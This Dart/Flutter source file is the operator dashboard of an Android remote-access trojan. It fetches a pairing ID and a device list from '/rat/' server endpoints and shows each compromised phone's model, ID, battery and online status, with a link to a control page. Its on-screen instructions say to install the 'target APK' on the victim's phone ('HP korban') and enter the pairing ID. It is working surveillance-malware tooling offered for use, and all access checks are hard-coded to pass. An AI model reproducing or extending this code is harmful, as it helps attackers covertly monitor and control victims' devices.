import 'config_service.dart';
import 'asset_service.dart';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';
import 'theme_provider.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
      super.key, this.username = '', this.role ='', this.sessionKey = ''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  List<dynamic> _visible = [];
  bool   _loading  = true;
  String? _errorMsg;
  String  _pairId  = '';
  
  // ===== SEMUA ROLE BISA AKSES DEVICE DASHBOARD =====
  // SEMUA role dianggap bisa melihat device sendiri
  bool get _isOwner => true; // SEMUA ROLE BISA
  
  PermissionResult? _perm;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
    WidgetsBinding.instance.addPostFrameCallback((_) => _showTutorImageDialog());
  }

  void _showTutorImageDialog() {
    final imageFile = File(AssetService.imagePathSync('tutornew.jpg'));
    if (!imageFile.existsSync()) return;
    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 40),
        child: Stack(
          children: [
            ClipRRect(
              borderRadius: BorderRadius.circular(16),
              child: Image.file(imageFile, fit: BoxFit.contain),
            ),
            Positioned(
              top: 8, right: 8,
              child: GestureDetector(
                onTap: () => Navigator.of(context).pop(),
                child: Container(
                  width: 32, height: 32,
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.6),
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(Icons.close_rounded, color: Colors.white, size: 18),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override void dispose() { _timer?.cancel(); super.dispose(); }

  // ── Ambil pairId + device list sekaligus ──────────────────────────────────
  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      // 1. Ambil pairId akun ini
      final pRes = await http
          .get(Uri.parse('${ConfigService.baseUrl}/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      // 2. Ambil device list (filter by owner / permission)
      final dRes = await http
          .get(Uri.parse('${ConfigService.baseUrl}/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Server error ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      // Tandai online/offline
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      // SEMUA ROLE dianggap approved
      PermissionResult perm = PermissionResult(approved: true, allDevices: true, devices: []);

      if (mounted) setState(() {
        _visible = devices; _perm = perm; _loading = false; _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  // ── Copy pairId ke clipboard ───────────────────────────────────────────────
  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        backgroundColor: Provider.of<ThemeProvider>(context, listen: false).primaryColor,
        content: const Text('ID berhasil disalin!'),
        duration: const Duration(seconds: 2)));
  }

  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);
    // SEMUA ROLE: denied = false
    final denied = false;

    return Scaffold(
      backgroundColor: theme.backgroundColor,
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.topLeft,
            radius: 1.5,
            colors: [theme.primaryColor.withOpacity(0.15), theme.backgroundColor, theme.backgroundColor],
            stops: const [0.0, 0.4, 1.0],
          ),
        ),
        child: CustomPaint(
          painter: _GridPainter(accentColor: theme.primaryColor),
          child: SafeArea(child: Column(children: [
            // ─ Header ─────────────────────────────────────────────────────────
            Container(
              padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
              decoration: BoxDecoration(
                color: theme.glassPrimary,
                border: Border(bottom: BorderSide(color: theme.primaryColor.withOpacity(0.2), width: 1)),
                boxShadow: [
                  BoxShadow(
                    color: theme.primaryColor.withOpacity(0.1),
                    blurRadius: 15,
                    spreadRadius: 2,
                    offset: const Offset(0, 4)
                  )
                ]
              ),
              child: Column(children: [
                Row(children: [
                  _statBox('ONLINE', '$_active', theme.primaryColor, theme),
                  const Spacer(),
                  Column(children: [
                    Text('DEVICE DASHBOARD',
                        style: TextStyle(
                          color: theme.primaryColor,
                          fontSize: 11,
                          letterSpacing: 2,
                          fontWeight: FontWeight.bold
                        )
                    ),
                    const SizedBox(height: 4),
                    Text('@${widget.username}',
                        style: TextStyle(color: theme.textSecondaryColor, fontSize: 9)),
                  ]),
                  const Spacer(),
                  _statBox('TOTAL', '${_visible.length}', theme.primaryColor, theme),
                ]),

                // ── PairID box ───────────────────────────────────────────────
                if (_pairId.isNotEmpty) ...[
                  const SizedBox(height: 12),
                  GestureDetector(
                    onTap: _copyPairId,
                    child: Container(
                      width: double.infinity,
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                      decoration: BoxDecoration(
                        color: theme.primaryColor.withOpacity(0.05),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: theme.primaryColor.withOpacity(0.3), width: 1),
                      ),
                      child: Row(children: [
                        Icon(Icons.link_rounded, color: theme.primaryColor, size: 18),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text('ID PAIRING (bagikan ke target)',
                                  style: TextStyle(
                                    color: theme.textSecondaryColor,
                                    fontSize: 9,
                                    letterSpacing: 1
                                  )
                              ),
                              const SizedBox(height: 4),
                              Text(_pairId,
                                  style: TextStyle(
                                      color: theme.primaryColor,
                                      fontSize: 16,
                                      fontWeight: FontWeight.bold,
                                      letterSpacing: 3,
                                      fontFamily: 'monospace'
                                  )
                              ),
                            ]
                          )
                        ),
                        const SizedBox(width: 8),
                        Column(
                          crossAxisAlignment: CrossAxisAlignment.center,
                          children: [
                            Icon(Icons.copy_rounded, color: theme.primaryColor, size: 18),
                            const SizedBox(height: 4),
                            Text('SALIN',
                                style: TextStyle(
                                  color: theme.primaryColor.withOpacity(0.8),
                                  fontSize: 8,
                                  fontWeight: FontWeight.bold
                                )
                            ),
                          ],
                        ),
                      ]),
                    ),
                  ),
                  const SizedBox(height: 6),
                  Text(
                    'Tap untuk menyalin ID',
                    style: TextStyle(color: theme.textSecondaryColor, fontSize: 9),
                    textAlign: TextAlign.center
                  ),
                ],
              ]),
            ),

            // ─ Error/Denied (denied selalu false, jadi tidak muncul) ─────────
            if (_errorMsg != null)
              _banner(Icons.error_rounded, _errorMsg!, theme.primaryColor, theme),

            // ─ Toolbar ────────────────────────────────────────────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 10, 16, 6),
              child: Row(children: [
                Text('CONNECTED DEVICES',
                    style: TextStyle(
                      color: theme.textSecondaryColor,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.5
                    )
                ),
                const Spacer(),
                GestureDetector(
                  onTap: () {
                    setState(() { _loading = true; _errorMsg = null; });
                    _loadAll();
                  },
                  child: Icon(Icons.refresh_rounded, color: theme.primaryColor, size: 18)
                ),
                const SizedBox(width: 12),
                // SEMUA ROLE bisa mengelola akses (opsional, bisa dihapus jika tidak perlu)
                GestureDetector(
                  onTap: () async {
                    await Navigator.push(context, MaterialPageRoute(
                      builder: (_) => DevicePermissionManagerPage(
                        sessionKey: widget.sessionKey,
                        allDevices: _visible
                      )
                    ));
                    _loadAll();
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                    decoration: BoxDecoration(
                      color: theme.primaryColor.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: theme.primaryColor.withOpacity(0.4))
                    ),
                    child: Row(children: [
                      Icon(Icons.manage_accounts_rounded, color: theme.primaryColor, size: 14),
                      const SizedBox(width: 6),
                      Text('Kelola Akses',
                          style: TextStyle(color: theme.primaryColor, fontSize: 11)),
                    ])
                  )
                ),
                const SizedBox(width: 10),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Icon(Icons.close_rounded, color: theme.primaryColor, size: 18)
                ),
              ])
            ),

            // ─ Device Grid ────────────────────────────────────────────────────
            Expanded(
              child: _loading
                  ? Center(
                      child: CircularProgressIndicator(
                        color: theme.primaryColor,
                        strokeWidth: 2,
                      )
                    )
                  : _visible.isEmpty
                      ? Center(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Icon(Icons.devices_other_rounded,
                                  color: theme.textSecondaryColor.withOpacity(0.3), size: 52),
                              const SizedBox(height: 14),
                              Text('NO DEVICES',
                                  style: TextStyle(
                                    color: theme.textPrimaryColor,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 2,
                                    fontSize: 13
                                  )
                              ),
                              const SizedBox(height: 6),
                              Text('Belum ada device terhubung',
                                  style: TextStyle(color: theme.textSecondaryColor, fontSize: 11)),
                              const SizedBox(height: 20),
                              Container(
                                margin: const EdgeInsets.symmetric(horizontal: 40),
                                padding: const EdgeInsets.all(16),
                                decoration: BoxDecoration(
                                  color: theme.primaryColor.withOpacity(0.05),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(color: theme.primaryColor.withOpacity(0.2))
                                ),
                                child: Column(children: [
                                  Icon(Icons.info_outline_rounded,
                                      color: theme.primaryColor, size: 22),
                                  const SizedBox(height: 10),
                                  Text('Cara hubungkan device:',
                                      style: TextStyle(
                                        color: theme.textPrimaryColor,
                                        fontSize: 11,
                                        fontWeight: FontWeight.bold
                                      )
                                  ),
                                  const SizedBox(height: 8),
                                  Text(
                                    '1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Device otomatis muncul di sini',
                                    style: TextStyle(color: theme.textSecondaryColor, fontSize: 10),
                                    textAlign: TextAlign.center,
                                  ),
                                ]),
                              ),
                            ]
                          )
                        )
                      : GridView.builder(
                          padding: const EdgeInsets.fromLTRB(14, 8, 14, 100),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3,
                            crossAxisSpacing: 10,
                            mainAxisSpacing: 10,
                            childAspectRatio: 0.72
                          ),
                          itemCount: _visible.length,
                          itemBuilder: (ctx, i) {
                            final d = _visible[i];
                            final on = d['online'] == true;
                            final sc = on ? theme.primaryColor : Colors.redAccent;

                            return GestureDetector(
                              onTap: () => Navigator.push(ctx, MaterialPageRoute(
                                  builder: (_) => ControlCenterPage(
                                      targetDevice: d, role: widget.role))),
                              child: Container(
                                padding: const EdgeInsets.all(10),
                                decoration: BoxDecoration(
                                  color: theme.glassPrimary,
                                  borderRadius: BorderRadius.circular(14),
                                  border: Border.all(
                                    color: on
                                      ? theme.primaryColor.withOpacity(0.3)
                                      : theme.textSecondaryColor.withOpacity(0.1),
                                    width: 1
                                  ),
                                  boxShadow: on
                                    ? [
                                        BoxShadow(
                                          color: theme.primaryColor.withOpacity(0.1),
                                          blurRadius: 8,
                                          spreadRadius: 1
                                        )
                                      ]
                                    : null
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        Icon(Icons.phone_android_rounded,
                                            color: theme.textSecondaryColor, size: 14),
                                        Container(
                                          padding: const EdgeInsets.symmetric(
                                              horizontal: 5, vertical: 2),
                                          decoration: BoxDecoration(
                                            color: sc.withOpacity(0.1),
                                            border: Border.all(
                                                color: sc.withOpacity(0.5)),
                                            borderRadius: BorderRadius.circular(6)
                                          ),
                                          child: Row(children: [
                                            Container(
                                              width: 5,
                                              height: 5,
                                              decoration: BoxDecoration(
                                                color: sc,
                                                shape: BoxShape.circle
                                              )
                                            ),
                                            const SizedBox(width: 4),
                                            Text(on ? 'ON' : 'OFF',
                                                style: TextStyle(
                                                  color: sc,
                                                  fontSize: 7,
                                                  fontWeight: FontWeight.bold
                                                )
                                            ),
                                          ]),
                                        ),
                                      ]
                                    ),
                                    const Spacer(),
                                    Text(d['model'] ?? 'Unknown',
                                        style: TextStyle(
                                          color: theme.textPrimaryColor,
                                          fontSize: 10,
                                          fontWeight: FontWeight.bold
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis
                                    ),
                                    const SizedBox(height: 4),
                                    Text(d['id'] ?? '-',
                                        style: TextStyle(
                                          color: theme.textSecondaryColor,
                                          fontSize: 8
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis
                                    ),
                                    const Spacer(),
                                    Row(children: [
                                      Icon(Icons.battery_charging_full_rounded,
                                          color: theme.textSecondaryColor, size: 11),
                                      const SizedBox(width: 4),
                                      Text('${d['battery'] ?? '?'}%',
                                          style: TextStyle(
                                            color: theme.textPrimaryColor,
                                            fontSize: 9
                                          )
                                      ),
                                    ]),
                                  ],
                                ),
                              ),
                            );
                          }
                        ),
            ),
          ])),
        ),
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c, ThemeProvider theme) => Container(
    margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      color: c.withOpacity(0.05),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: c.withOpacity(0.2))
    ),
    child: Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Icon(icon, color: c, size: 16),
        const SizedBox(width: 10),
        Expanded(
          child: Text(msg,
              style: TextStyle(color: theme.textSecondaryColor, fontSize: 11, height: 1.4)),
        ),
      ]
    )
  );

  Widget _statBox(String l, String v, Color c, ThemeProvider theme) => Column(children: [
    Text(l,
        style: TextStyle(
          color: theme.textSecondaryColor,
          fontSize: 8,
          letterSpacing: 1
        )
    ),
    const SizedBox(height: 4),
    Text(v,
        style: TextStyle(
          color: c,
          fontSize: 20,
          fontWeight: FontWeight.bold,
          shadows: [
            Shadow(
              blurRadius: 8,
              color: c.withOpacity(0.5),
              offset: const Offset(0, 0)
            )
          ]
        )
    ),
  ]);
}

// Custom Grid Painter untuk DeviceDashboard
class _GridPainter extends CustomPainter {
  final Color accentColor;
  
  _GridPainter({required this.accentColor});
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.white.withOpacity(0.02)..strokeWidth = 0.8..style = PaintingStyle.stroke;
    const gridSize = 30.0;
    for (double x = 0; x <= size.width; x += gridSize) canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    for (double y = 0; y <= size.height; y += gridSize) canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    
    final accentPaint = Paint()..color = accentColor.withOpacity(0.08)..strokeWidth = 1.5..style = PaintingStyle.stroke;
    for (double x = 0; x <= size.width; x += gridSize * 5) canvas.drawLine(Offset(x, 0), Offset(x, size.height), accentPaint);
    for (double y = 0; y <= size.height; y += gridSize * 5) canvas.drawLine(Offset(0, y), Offset(size.width, y), accentPaint);
    
    final dotPaint = Paint()..color = accentColor.withOpacity(0.1)..style = PaintingStyle.fill;
    for (double x = 0; x <= size.width; x += gridSize) {
      for (double y = 0; y <= size.height; y += gridSize) canvas.drawCircle(Offset(x, y), 1.5, dotPaint);
    }
  }

  @override
  bool shouldRepaint(covariant _GridPainter oldDelegate) {
    return oldDelegate.accentColor != accentColor;
  }
}